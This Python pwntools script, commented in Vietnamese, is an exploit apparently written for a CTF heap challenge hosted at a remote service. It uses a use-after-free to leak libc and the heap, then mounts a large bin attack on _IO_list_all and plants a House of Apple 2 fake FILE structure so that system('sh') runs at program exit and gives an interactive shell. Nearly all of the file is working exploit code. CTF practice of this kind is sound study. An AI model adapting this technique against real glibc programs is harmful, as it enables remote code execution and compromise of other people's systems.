from pwn import *

# --- CẤU HÌNH ---
exe = ELF('./rce', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
context.binary = exe
context.log_level = 'info'

context.terminal = ['cmd.exe', '/c', 'start', 'cmd.exe', '/c', 'wsl.exe']

def conn():
    if args.LOCAL:
        # Tắt ASLR để debug cho dễ nếu cần
        return process('./rce') 
    else:
        return remote('ctf.csd.lol', 2024)

p = conn()

# --- HELPERS ---
def alloc(idx, size, data=b"AAAA"):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"idx: ", str(idx).encode())
    p.sendlineafter(b"size: ", str(size).encode())
    p.sendafter(b"data: ", data)

def free(idx):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"idx: ", str(idx).encode())

def edit(idx, data):
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"idx: ", str(idx).encode())
    p.sendafter(b"data: ", data)

def view(idx):
    p.sendlineafter(b"> ", b"4")
    p.sendlineafter(b"idx: ", str(idx).encode())
    p.recvuntil(b"data: ")
    content = p.recvline()
    if content.endswith(b'\n'):
        content = content[:-1]
    return content

# --- EXPLOIT START ---
log.info("--- STARTING RCE EXPLOIT ---")

# =============================================================================
# BƯỚC 1: LEAK LIBC (SỬ DỤNG KỸ THUẬT ANCHOR)
# =============================================================================
log.info("[1] Allocating chunks for leak...")

# Chunk 0: Anchor (Mỏ neo) - Kích thước nhỏ
alloc(0, 0x20, b"Anchor") 

# Chunk 1: Victim - Kích thước LỚN (0x2000 > 4096) để ép ra chunk riêng
alloc(1, 0x18000, b"Victim1") 

log.info("--> Freeing Anchor (idx 0) to release Victim (idx 1)...")
# Quan trọng: Free 0 sẽ kéo theo việc hệ thống free luôn khối nhớ của 1.
# Nhưng ta vẫn còn pointer của 1 trong mảng chunks[] -> UAF.
free(0)

# DEBUG: Pause tại đây để check trong GDB
# Gõ lệnh trong GDB: x/4gx <địa_chỉ_chunk_1> (Bạn cần tìm địa chỉ này hoặc xem heap bins)
# Nếu thành công, bạn sẽ thấy các pointer (0x7f...) thay vì chữ "Victim1"
if args.LOCAL:
    gdb.attach(p, gdbscript='''
        vis_heap_chunks
        p/x chunks[1]
        x/4gx chunks[1]
    ''')
    input("Press Enter to continue after checking GDB...")

# Đọc dữ liệu từ chunk 1 (đã bị free)
leak_data = view(1)

# Kiểm tra xem leak có thành công không
if b"Victim1" in leak_data:
    log.error("LỖI: Chunk chưa được free (vẫn còn dữ liệu cũ). Hãy kiểm tra lại size alloc!")
    exit(1)

if len(leak_data) < 8: leak_data = leak_data.ljust(8, b'\x00')
libc_leak = u64(leak_data[:8])
log.info(f"Raw Leak: {hex(libc_leak)}")

# Tính Libc Base (Cần offset chuẩn từ GDB vmmap)
# Offset thường là (Leak - LibcBase). Ví dụ leak là 0x7f...1c0, base là 0x7f...000
offset_libc = 0x1d2cc0 # <--- CHỈNH SỐ NÀY DỰA TRÊN GDB CỦA BẠN
libc.address = libc_leak - offset_libc
log.success(f"Libc Base: {hex(libc.address)}")

# =============================================================================
# BƯỚC 2: LARGE BIN ATTACK SETUP
# =============================================================================
log.info("[2] Setting up Large Bin Attack...")

# 2.1. Đưa Chunk 1 vào Large Bin
# Alloc một chunk mới (Chunk 2) lớn hơn chunk 1 để trigger sắp xếp Unsorted Bin
alloc(2, 0x19000, b"TriggerSort1") 

# Lúc này Chunk 1 đã vào Large Bin. Ta leak Heap từ nó.
heap_leak_data = view(1)
if len(heap_leak_data) >= 24:
    # Offset 0x10 trong data là fd_nextsize
    chunk1_addr = u64(heap_leak_data[16:24].ljust(8, b'\x00'))
    log.success(f"Chunk 1 Address (Heap): {hex(chunk1_addr)}")
else:
    log.error("Failed to leak Heap from Large Bin")
    exit(1)

# 2.2. Chuẩn bị Fake FILE payload vào Chunk 1
# Vì ta có quyền edit(1), ta ghi thẳng Fake FILE vào chính Chunk 1.
_IO_list_all = libc.sym['_IO_list_all']
system = libc.sym['system']
lock_addr = libc.address + 0x1d3000 + 0x100 

# House of Apple 2 Payload
fp = FileStructure(null=0)
fp.flags = 0 
fp._IO_write_ptr = 0x1      
fp._IO_write_base = 0x0
fp._lock = lock_addr
fp._wide_data = chunk1_addr + 0xe0 # Wide data ở offset 0xe0
fp.vtable = libc.sym['_IO_wfile_jumps']

# Command shell ở đầu
payload_file = b"  sh;" + bytes(fp)[5:]

# Wide Data fake
fake_wide_data = flat({
    0xe0: system # _wide_vtable->doallocate
}, filler=b'\x00', length=0xf0)

# Ghép payload
full_payload = payload_file.ljust(0xe0, b'\x00') + fake_wide_data
full_payload = full_payload[:0xe0 + 0xe0] + p64(chunk1_addr + 0xe0) 

# Ghi payload vào Chunk 1
edit(1, full_payload)

# =============================================================================
# BƯỚC 3: TRIGGER ATTACK
# =============================================================================
log.info("[3] Triggering Large Bin Attack...")

# Mục tiêu: Ghi địa chỉ Chunk 1 vào _IO_list_all
# Sửa Chunk 1 (đang ở Large Bin): bk_nextsize = Target - 0x20
target = _IO_list_all - 0x20
# Payload: [fd][bk][fd_nextsize][bk_nextsize]
# fd, bk: giữ nguyên (đang trỏ main_arena) - lấy từ leak cũ hoặc giả định
payload_lba = p64(libc_leak)*2 + p64(chunk1_addr) + p64(target)
# Lưu ý: edit sẽ ghi đè từ đầu chunk data. FakeFILE của ta đang ở đó.
# Ta chỉ cần sửa 32 bytes đầu (header large bin), phần sau (FakeFILE) giữ nguyên.
# Nhưng edit() ghi đè toàn bộ? Không, edit() của bài này dùng read(), ghi bao nhiêu byte tùy ý?
# Check hàm edit: read(0, ptr, size). Size lấy từ mảng sizes[].
# Size của chunk 1 là 0x2000. Ta phải gửi toàn bộ lại hoặc tính toán offset.
# Tốt nhất: Gửi lại Header Attack + Fake FILE (phần còn lại).
edit(1, payload_lba + full_payload[32:])

# Trigger: Cần đưa thêm 1 chunk nữa vào Large Bin để kích hoạt ghi đè.
# Quy trình Anchor lần 2:
alloc(3, 0x20, b"Anchor2")
alloc(4, 0x18000, b"Victim2") # Cùng size với Chunk 1
free(3) # Free Anchor 2 -> Chunk 4 vào Unsorted Bin

# Alloc kích thước lớn hơn để đẩy Chunk 4 vào Large Bin -> Trigger
alloc(5, 0x19000, b"TriggerAttack")
log.success("Attack Triggered! Exiting to shell...")

# Exit để gọi _IO_flush_all -> system("sh")
p.sendlineafter(b"> ", b"0")

p.interactive()